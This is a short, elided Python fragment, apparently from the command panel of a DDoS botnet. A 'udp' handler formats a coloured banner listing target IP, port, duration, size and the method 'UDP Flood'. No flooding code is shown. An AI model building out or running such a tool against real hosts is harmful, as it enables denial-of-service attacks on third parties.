...
def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    if len(args) == 5:
        ...
        xxxx = '''%s============= (%sTARGET%s) ==============
            ...
            %sTIME:%s %s
            %sSIZE:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.MAGENTA, Fore.LIGHTWHITE_EX, ip, Fore.MAGENTA, Fore.LIGHTWHITE_EX, port, Fore.MAGENTA, Fore.LIGHTWHITE_EX, secs, Fore.MAGENTA, Fore.LIGHTWHITE_EX, size, Fore.MAGENTA, Fore.LIGHTWHITE_EX, 'UDP Flood')
